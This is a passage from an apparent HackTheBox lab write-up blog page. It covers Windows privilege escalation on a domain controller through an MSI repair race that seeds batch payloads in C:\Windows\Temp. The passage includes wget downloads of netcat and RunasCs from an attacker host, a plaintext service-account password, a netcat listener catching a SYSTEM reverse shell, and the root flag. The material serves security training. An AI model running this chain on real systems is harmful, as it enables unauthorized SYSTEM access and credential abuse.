+</span></span><span class=line><span class=cl><span class=k>foreach</span> <span class=p>(</span><span class=nv>$ctr</span> <span class=k>in</span> <span class=mf>0</span><span class=p>.</span><span class=mf>.1</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=nv>$num</span> <span class=p>=</span> <span class=nv>$MinPID</span><span class=p>;</span> <span class=nv>$num</span> <span class=o>-le</span> <span class=nv>$MaxPID</span><span class=p>;</span> <span class=nv>$num</span><span class=p>++)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$filePath</span> <span class=p>=</span> <span class=s2>&#34;C:\Windows\Temp\cmk_all_</span><span class=p>$(</span><span class=nv>$num</span><span class=p>)</span><span class=s2>_</span><span class=p>$(</span><span class=nv>$ctr</span><span class=p>)</span><span class=s2>.cmd&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=k>try</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=p>[</span><span class=no>System.IO.File</span><span class=p>]::</span><span class=n>WriteAllText</span><span class=p>(</span><span class=nv>$filePath</span><span class=p>,</span> <span class=nv>$BatchPayload</span><span class=p>,</span> <span class=p>[</span><span class=no>System.Text.Encoding</span><span class=p>]::</span><span class=n>ASCII</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=nb>Set-ItemProperty</span> <span class=n>-Path</span> <span class=nv>$filePath</span> <span class=n>-Name</span> <span class=n>IsReadOnly</span> <span class=n>-Value</span> <span class=vm>$true</span> <span class=n>-ErrorAction</span> <span class=n>SilentlyContinue</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>catch</span> <span class=p>{</span> <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nb>Write-Host</span> <span class=s2>&#34;[*] Seeding complete.&#34;</span>
+</span></span><span class=line><span class=cl><span class=nb>Write-Host</span> <span class=s2>&#34;[*] Triggering MSI repair...&#34;</span>
+</span></span><span class=line><span class=cl><span class=nb>Start-Process</span> <span class=s2>&#34;msiexec.exe&#34;</span> <span class=n>-ArgumentList</span> <span class=s2>&#34;/fa </span><span class=se>`&#34;</span><span class=nv>$msi</span><span class=se>`&#34;</span><span class=s2> /qn /l*vx C:\Windows\Temp\cmk_repair.log&#34;</span> <span class=n>-Wait</span>
+</span></span><span class=line><span class=cl><span class=nb>Write-Host</span> <span class=s2>&#34;[*] Trigger sent. Check listener.&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>EOF</span></span></span></code></pre></td></tr></table></div></div></div><h4 id=2-staging-the-payloads id=2-staging-the-payloads><span class=me-2>2. Staging the Payloads</span>
+<a href=#2-staging-the-payloads class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>We copy our exploit assets to the global writeable directory <code>C:\Windows\Temp\</code>:</p><h3 id=compiling-and-executing-runascs id=compiling-and-executing-runascs><span class=me-2>Compiling and Executing RunasCs</span>
+<a href=#compiling-and-executing-runascs class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Because we do not have an administrative transition tool on disk, we download the source code of <strong>RunasCs</strong> (an offensive utility that spawns processes under different credentials with a fully functional network/interactive token) and compile it on-the-fly using the native .NET C# compiler</p><h3 id=wget-ncexe id=wget-ncexe><span class=me-2>wget nc.exe</span>
+<a href=#wget-ncexe class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class=code-block><div class=code-header><span data-label-text=Shell><i class="fas fa-code fa-fw small"></i></span> <button aria-label=copy data-title-succeed=Copied!><i class="far fa-clipboard"></i></button></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl> ╭─nabiasa@nabiasa in repo: RunasCs
+</span></span><span class=line><span class=cl> ╰─λ wget https://github.com/int0x33/nc.exe/raw/master/nc64.exe -O nc.exe</span></span></code></pre></td></tr></table></div></div></div><h3 id=wget id=wget><span class=me-2>wget</span>
+<a href=#wget class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class=code-block><div class=code-header><span data-label-text=Powershell><i class="fas fa-code fa-fw small"></i></span> <button aria-label=copy data-title-succeed=Copied!><i class="far fa-clipboard"></i></button></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>wget </span><span class=s2>&#34;http://10.10.14.30:8000/RunasCs.cs&#34;</span> <span class=n>-UseBasicParsing</span> <span class=n>-OutFile</span> <span class=s2>&#34;RunasCs.cs&#34;</span>
+</span></span><span class=line><span class=cl><span class=nb>wget </span><span class=s2>&#34;http://10.10.14.30:8000/nc&#34;</span> <span class=n>-UseBasicParsing</span> <span class=n>-OutFile</span> <span class=s2>&#34;nc.exe&#34;</span></span></span></code></pre></td></tr></table></div></div></div><h3 id=dir id=dir><span class=me-2>dir</span>
+<a href=#dir class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class=code-block><div class=code-header><span data-label-text=Cmd><i class="fas fa-code fa-fw small"></i></span> <button aria-label=copy data-title-succeed=Copied!><i class="far fa-clipboard"></i></button></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl>PS C:\Users\monitoring_svc\Documents<span class=p>&gt;</span> dir bytes remaining: 1235)
+</span></span><span class=line><span class=cl>    Directory: C:\Users\monitoring_svc\Documents
+</span></span><span class=line><span class=cl>Mode                 LastWriteTime         Length Name
+</span></span><span class=line><span class=cl>----                 -------------         ------ ----
+</span></span><span class=line><span class=cl>-a----         5/16/2026   1:53 PM           1235 bad.ps1
+</span></span><span class=line><span class=cl>-a----         5/16/2026   1:52 PM          45272 nc.exe
+</span></span><span class=line><span class=cl>-a----         5/16/2026   1:34 PM          94880 RunasCs.cs</span></span></code></pre></td></tr></table></div></div></div><h3 id=copy-to-cwindowstemp id=copy-to-cwindowstemp><span class=me-2>copy to C:\Windows\Temp</span>
+<a href=#copy-to-cwindowstemp class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class=code-block><div class=code-header><span data-label-text=Powershell><i class="fas fa-code fa-fw small"></i></span> <button aria-label=copy data-title-succeed=Copied!><i class="far fa-clipboard"></i></button></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>PS </span><span class=n>C:</span><span class=p>\</span><span class=n>Users</span><span class=p>\</span><span class=n>monitoring_svc</span><span class=p>\</span><span class=n>Documents</span><span class=p>&gt;</span> <span class=nb>copy </span><span class=n>C:</span><span class=p>\</span><span class=n>Users</span><span class=p>\</span><span class=n>monitoring_svc</span><span class=p>\</span><span class=n>Documents</span><span class=p>\</span><span class=n>nc</span><span class=p>.</span><span class=py>exe</span> <span class=n>C:</span><span class=p>\</span><span class=n>Windows</span><span class=p>\</span><span class=n>Temp</span><span class=p>\</span><span class=n>nc</span><span class=p>.</span><span class=py>exe</span>
+</span></span><span class=line><span class=cl><span class=nb>PS </span><span class=n>C:</span><span class=p>\</span><span class=n>Users</span><span class=p>\</span><span class=n>monitoring_svc</span><span class=p>\</span><span class=n>Documents</span><span class=p>&gt;</span> <span class=nb>copy </span><span class=n>C:</span><span class=p>\</span><span class=n>Users</span><span class=p>\</span><span class=n>monitoring_svc</span><span class=p>\</span><span class=n>Documents</span><span class=p>\</span><span class=n>bad</span><span class=p>.</span><span class=py>ps1</span> <span class=n>C:</span><span class=p>\</span><span class=n>Windows</span><span class=p>\</span><span class=n>Temp</span><span class=p>\</span><span class=n>bad</span><span class=p>.</span><span class=py>ps1</span>
+</span></span><span class=line><span class=cl><span class=nb>PS </span><span class=n>C:</span><span class=p>\</span><span class=n>Users</span><span class=p>\</span><span class=n>monitoring_svc</span><span class=p>\</span><span class=n>Documents</span><span class=p>&gt;</span> <span class=nb>copy </span><span class=n>C:</span><span class=p>\</span><span class=n>Users</span><span class=p>\</span><span class=n>monitoring_svc</span><span class=p>\</span><span class=n>Documents</span><span class=p>\</span><span class=n>RunasCs</span><span class=p>.</span><span class=py>exe</span> <span class=n>C:</span><span class=p>\</span><span class=n>Windows</span><span class=p>\</span><span class=n>Temp</span><span class=p>\</span><span class=n>RunasCs</span><span class=p>.</span><span class=py>exe</span>
+</span></span><span class=line><span class=cl><span class=nb>PS </span><span class=n>C:</span><span class=p>\</span><span class=n>Users</span><span class=p>\</span><span class=n>monitoring_svc</span><span class=p>\</span><span class=n>Documents</span><span class=p>&gt;</span> <span class=nb>cd </span><span class=n>C:</span><span class=p>\</span><span class=n>Windows</span><span class=p>\</span><span class=n>Temp</span>
+</span></span><span class=line><span class=cl><span class=nb>PS </span><span class=n>C:</span><span class=p>\</span><span class=n>Windows</span><span class=p>\</span><span class=n>Temp</span><span class=p>&gt;</span> <span class=p>.\</span><span class=n>RunasCs</span><span class=p>.</span><span class=py>exe</span> <span class=n>web_svc</span> <span class=s2>&#34;dksehdgh712!@#&#34;</span> <span class=s2>&#34;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\Windows\Temp\bad.ps1&#34;</span></span></span></code></pre></td></tr></table></div></div></div><h3 id=execution--shell-elevation id=execution--shell-elevation><span class=me-2>Execution & Shell Elevation</span>
+<a href=#execution--shell-elevation class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><h4 id=1-running-the-exploit-via-runascs id=1-running-the-exploit-via-runascs><span class=me-2>1. Running the Exploit via RunasCs</span>
+<a href=#1-running-the-exploit-via-runascs class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>We execute <code>RunasCs</code> to launch our exploit script as <code>web_svc</code>, bypassing the restrictions applied to our current <code>monitoring_svc</code> session:</p><div class=code-block><div class=code-header><span data-label-text=Powershell><i class="fas fa-code fa-fw small"></i></span> <button aria-label=copy data-title-succeed=Copied!><i class="far fa-clipboard"></i></button></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>PS </span><span class=n>C:</span><span class=p>\</span><span class=n>Users</span><span class=p>\</span><span class=n>monitoring_svc</span><span class=p>\</span><span class=n>Documents</span><span class=p>&gt;</span> <span class=n>C:</span><span class=p>\</span><span class=n>Windows</span><span class=p>\</span><span class=n>Microsoft</span><span class=p>.</span><span class=n>NET</span><span class=p>\</span><span class=n>Framework64</span><span class=p>\</span><span class=n>v4</span><span class=p>.</span><span class=py>0</span><span class=p>.</span><span class=mf>30319</span><span class=p>\</span><span class=n>csc</span><span class=p>.</span><span class=py>exe</span> <span class=n>-target:exe</span> <span class=n>-optimize</span> <span class=n>-out:RunasCs</span><span class=p>.</span><span class=py>exe</span> <span class=n>RunasCs</span><span class=p>.</span><span class=py>cs</span>
+</span></span><span class=line><span class=cl><span class=n>Microsoft</span> <span class=p>(</span><span class=n>R</span><span class=p>)</span> <span class=n>Visual</span> <span class=n>C</span><span class=c># Compiler version 4.8.4161.0</span></span></span></code></pre></td></tr></table></div></div></div><h3 id=runascsexe-web_svc id=runascsexe-web_svc><span class=me-2>RunasCs.exe web_svc</span>
+<a href=#runascsexe-web_svc class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class=code-block><div class=code-header><span data-label-text=Powershell><i class="fas fa-code fa-fw small"></i></span> <button aria-label=copy data-title-succeed=Copied!><i class="far fa-clipboard"></i></button></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>PS </span><span class=n>C:</span><span class=p>\</span><span class=n>Windows</span><span class=p>\</span><span class=n>Temp</span><span class=p>&gt;</span> <span class=p>.\</span><span class=n>RunasCs</span><span class=p>.</span><span class=py>exe</span> <span class=n>web_svc</span> <span class=s2>&#34;dksehdgh712!@#&#34;</span> <span class=s2>&#34;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\Windows\Temp\bad.ps1&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>[*]</span> <span class=n>Found</span> <span class=n>MSI</span> <span class=n>at</span> <span class=n>C:</span><span class=p>\</span><span class=n>Windows</span><span class=p>\</span><span class=n>Installer</span><span class=p>\</span><span class=n>1e6f2</span><span class=p>.</span><span class=py>msi</span>
+</span></span><span class=line><span class=cl><span class=p>[*]</span> <span class=n>Seeding</span> <span class=mf>1000</span> <span class=n>to</span> <span class=mf>15000</span><span class=p>...</span>
+</span></span><span class=line><span class=cl><span class=p>[*]</span> <span class=n>Seeding</span> <span class=n>complete</span><span class=p>.</span>
+</span></span><span class=line><span class=cl><span class=p>[*]</span> <span class=n>Triggering</span> <span class=n>MSI</span> <span class=n>repair</span><span class=p>...</span>
+</span></span><span class=line><span class=cl><span class=p>[*]</span> <span class=n>Trigger</span> <span class=n>sent</span><span class=p>.</span> <span class=n>Check</span> <span class=n>listener</span><span class=p>.</span></span></span></code></pre></td></tr></table></div></div></div><blockquote><p class=prompt-info>The script locates the cached MSI database, seeds the target PIDs, and initiates the silent repair:</p></blockquote><h4 id=2-catching-the-system-shell id=2-catching-the-system-shell><span class=me-2>2. Catching the SYSTEM Shell</span>
+<a href=#2-catching-the-system-shell class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>On our attack machine, we set up our Netcat listener on port <code>9001</code>:</p><div class=code-block><div class=code-header><span data-label-text=Shell><i class="fas fa-code fa-fw small"></i></span> <button aria-label=copy data-title-succeed=Copied!><i class="far fa-clipboard"></i></button></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>╭─nabiasa@nabiasa in repo: RunasCs on  master <span class=o>[</span>?<span class=o>]</span>
+</span></span><span class=line><span class=cl>╰─λ nc -lvnp <span class=m>9001</span>
+</span></span><span class=line><span class=cl>Listening on 0.0.0.0 <span class=m>9001</span>
+</span></span><span class=line><span class=cl>Connection received on 10.129.243.199 <span class=m>54854</span>
+</span></span><span class=line><span class=cl>Microsoft Windows <span class=o>[</span>Version 10.0.20348.3207<span class=o>]</span>
+</span></span><span class=line><span class=cl><span class=o>(</span>c<span class=o>)</span> Microsoft Corporation. All rights reserved.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>C:<span class=se>\W</span>indows<span class=se>\s</span>ystem32&gt;</span></span></code></pre></td></tr></table></div></div></div><blockquote><p class=prompt-info>Once <code>msiexec</code> matches one of our pre-created PID batch files during the repair process, our payload is executed under the installer&rsquo;s context, returning a high-privileged shell:</p></blockquote><h4 id=whoami-nt-authoritysystem id=whoami-nt-authoritysystem><span class=me-2>whoami nt authority\system</span>
+<a href=#whoami-nt-authoritysystem class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class=code-block><div class=code-header><span data-label-text=Cmd><i class="fas fa-code fa-fw small"></i></span> <button aria-label=copy data-title-succeed=Copied!><i class="far fa-clipboard"></i></button></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl>C<span class=p>:</span><span class=nl>\Users\Administrator\Desktop</span><span class=c1>&gt;whoami</span>
+</span></span><span class=line><span class=cl>whoami
+</span></span><span class=line><span class=cl>nt authority\system</span></span></code></pre></td></tr></table></div></div></div><h2 id=flag-retrieval id=flag-retrieval><span class=me-2>Flag Retrieval</span>
+<a href=#flag-retrieval class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>With full <code>NT AUTHORITY\SYSTEM</code> access on the Domain Controller, we navigate to the Administrator&rsquo;s Desktop and retrieve the root flag:</p><div class=code-block><div class=code-header><span data-label-text=Cmd><i class="fas fa-code fa-fw small"></i></span> <button aria-label=copy data-title-succeed=Copied!><i class="far fa-clipboard"></i></button></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl>C<span class=p>:</span><span class=nl>\Users\Administrator\Desktop</span><span class=c1>&gt;type root.txt</span>
+</span></span><span class=line><span class=cl><span class=k>type</span> root.txt
+</span></span><span class=line><span class=cl>9d906912ceee88a268d668873adb1</span></span></code></pre></td></tr></table></div></div></div><h3 id=powershellexe-get-localuser id=powershellexe-get-localuser><span class=me-2>powershell.exe Get-LocalUser</span>
+<a href=#powershellexe-get-localuser class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class=code-block><div class=code-header><span data-label-text=Cmd><i class="fas fa-code fa-fw small"></i></span> <button aria-label=copy data-title-succeed=Copied!><i class="far fa-clipboard"></i></button></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl>C<span class=p>:</span><span class=nl>\Users\Administrator\Desktop</span><span class=c1>&gt;powershell.exe</span>
+</span></span><span class=line><span class=cl>powershell.exe
+</span></span><span class=line><span class=cl>Windows PowerShell
+</span></span><span class=line><span class=cl>Copyright (C) Microsoft Corporation. All rights reserved.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>PS C:\Users\Administrator\Desktop<span class=p>&gt;</span> Get-LocalUser <span class=p>|</span> Select-Object Name, Enabled, LastLogon, PasswordLastSet
+</span></span><span class=line><span class=cl>Get-LocalUser <span class=p>|</span> Select-Object Name, Enabled, LastLogon, PasswordLastSet
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Name           Enabled LastLogon            PasswordLastSet     
+</span></span><span class=line><span class=cl>----           ------- ---------            ---------------     
+</span></span><span class=line><span class=cl>Administrator     True 5/16/2026 2:13:22 PM 4/9/2025 4:00:49 PM 
+</span></span><span class=line><span class=cl>Guest            False                                          
+</span></span><span class=line><span class=cl>krbtgt           False                      4/2/2025 6:38:45 PM 
+</span></span><span class=line><span class=cl>web_svc           True 5/16/2026 2:13:53 PM 4/9/2025 3:59:38 PM 
+</span></span><span class=line><span class=cl>monitoring_svc    True 5/16/2026 1:00:26 PM 5/16/2026 2:13:55 PM</span></span></code></pre></td></tr></table></div></div></div><hr></div><div class="post-tail-wrapper text-muted"><div class=post-tags><i class="fa fa-tags fa-fw me-1"></i>
+<a href=/tags/activedirectory/ class="post-tag no-text-decoration">ActiveDirectory</a>
+<a href=/tags/hackthebox/ class="post-tag no-text-decoration">HackTheBox</a>
+<a href=/tags/hard/ class="post-tag no-text-decoration">Hard</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-5 pb-2"><div class=license-wrapper></div></div></div></article></main><aside aria-label=Panel id=panel-wrapper class="col-xl-3 ps-2 text-muted"><div class=access></div><div class="toc-border-cover z-3"></div><section id=toc-wrapper class="invisible position-sticky ps-0 pe-4 pb-4"><h2 class="panel-heading ps-3 pb-2 mb-0">Contents</h2><nav id=toc></nav></section></aside></div><div class=row><div id=tail-wrapper class="col-12 col-lg-11 col-xl-9 px-md-4"><nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation"><a href=/post/2026-07-10-pirytgandlaf/ class="btn btn-outline-primary" aria-label=Older><p>Piryt with Gandlaf</p></a><div class="btn btn-outline-primary disabled" aria-label=Newer><p>-</p></div></nav><footer aria-label="Site Info" class="d-flex flex-column justify-content-center text-muted
+flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3"><p>©
+<time>2026</time>
+<span data-bs-toggle=tooltip data-bs-placement=top title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">synack rights reserved.</span></p></footer></div></div><div id=search-result-wrapper class="d-flex justify-content-center d-none"><div class="col-11 content"><div id=search-hints><section><h2 class=panel-heading>Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"><a class="post-tag btn btn-outline-primary" href=https://synack-rm-f.github.io/tags/activedirectory/>activedirectory</a>
+<a class="post-tag btn btn-outline-primary" href=https://synack-rm-f.github.io/tags/hackthebox/>hackthebox</a>
+<a class="post-tag btn btn-outline-primary" href=https://synack-rm-f.github.io/tags/hard/>hard</a>
+<a class="post-tag btn btn-outline-primary" href=https://synack-rm-f.github.io/tags/internals/>internals</a>
+<a class="post-tag btn btn-outline-primary" href=https://synack-rm-f.github.io/tags/research/>research</a>
+<a class="post-tag btn btn-outline-primary" href=https://synack-rm-f.github.io/tags/windows/>windows</a></div></section></div><div id=search-results class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div><script>const DEFAULT_CONFIG={search:{minChars:1,maxResults:5,fields:{title:!0,description:!0,section:!0,contents:!0},strictMode:!0}};class FastSearch{constructor({searchInput:e,resultsContainer:t,json:n,searchResultTemplate:s=null,noResultsText:o=null}){this.searchInput=e,this.resultsContainer=t,this.json=n,this.searchResultTemplate=s,this.noResultsText=o,this.init()}init(){this.loadSearchIndex(),this.searchInput.addEventListener("input",e=>{if(!this.searchIndex){this.resultsContainer.innerHTML='<li class="search-message">Loading search index...</li>';return}this.performSearch(this.searchInput.value)})}async loadSearchIndex(){try{const e=await fetch(this.json);if(!e.ok)throw new Error("Failed to load search index");const t=await e.json();this.searchIndex=t.map(e=>({...e,searchableTitle:e.title?.toLowerCase()||"",searchableDesc:e.desc?.toLowerCase()||"",searchableSection:e.section?.toLowerCase()||"",searchableContents:e.contents?.toLowerCase()||""}))}catch(e){console.error("Error loading search index:",e),this.resultsContainer.innerHTML='<li class="search-message">Error loading search index...</li>'}}escapeHtml(e){return e?e.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;").replace(/'/g,"&#039;"):""}containsTerm(e,t){return!!e&&!!t&&e.includes(t)}performSearch(e){if(e=e.toLowerCase().trim(),!e||!this.searchIndex||e.length<DEFAULT_CONFIG.search.minChars){this.resultsContainer.innerHTML="";return}const s=[e,...e.split(/\s+/).filter(e=>e.length>0)],t=[...new Set(s)],o=DEFAULT_CONFIG.search.strictMode,n=this.searchIndex.map(e=>{const s=this.checkFieldsForMatch(e,t[0]);if(o&&!s)return{item:e,score:0,matched:!1};let n=0,i=0,a=!1;t.forEach((t,s)=>{const r=s===0,o=this.checkFieldsForMatch(e,t);o&&(i++,o.inTitle&&(n+=r?10:5,a=!0),o.inDesc&&(n+=r?8:4),o.inSection&&(n+=r?6:3),o.inContents&&(n+=r?4:2))});const r=i/t.length,c=n*r*(a?1.5:1);return{item:e,score:c,matched:s}}).filter(e=>e.matched).sort((e,t)=>t.score-e.score).slice(0,DEFAULT_CONFIG.search.maxResults).map(e=>e.item);if(n.length===0){this.resultsContainer.innerHTML='<p class="mt-5">Oops! No results found.</p>';return}const i=n.map(e=>{let t="",n="";return e.categories&&(t=e.categories.join(", "),t=`<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${t}</div>`),e.tags&&(n=e.tags.join(", "),n=`<div><i class="fa fa-tag fa-fw"></i>${n}</div>`),`
+        <article class="px-1 px-sm-2 px-lg-4 px-xl-0">
+          <header>
+            <h2><a href="${this.escapeHtml(e.permalink)}">${this.escapeHtml(e.title)}</a></h2>
+            <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">
+              ${t}
+              ${n}
+            </div>
+          </header>
+          <p>${this.escapeHtml(e.contents)}</p>
+        </article>
+      `}).join("");this.resultsContainer.innerHTML=i}checkFieldsForMatch(e,t){const n={inTitle:!1,inDesc:!1,inSection:!1,inContents:!1};return DEFAULT_CONFIG.search.fields.title&&this.containsTerm(e.searchableTitle,t)&&(n.inTitle=!0),DEFAULT_CONFIG.search.fields.description&&this.containsTerm(e.searchableDesc,t)&&(n.inDesc=!0),DEFAULT_CONFIG.search.fields.section&&this.containsTerm(e.searchableSection,t)&&(n.inSection=!0),DEFAULT_CONFIG.search.fields.contents&&this.containsTerm(e.searchableContents,t)&&(n.inContents=!0),!!(n.inTitle||n.inDesc||n.inSection||n.inContents)&&n}}const search=new FastSearch({searchInput:document.getElementById("search-input"),resultsContainer:document.getElementById("search-results"),json:`/index.json`})</script></div><aside aria-label="Scroll to Top"><button id=back-to-top type=button class="btn btn-lg btn-box-shadow">
+<i class="fas fa-angle-up"></i></button></aside></div><div id=mask class="d-none position-fixed w-100 h-100 z-1"></div></body></html>
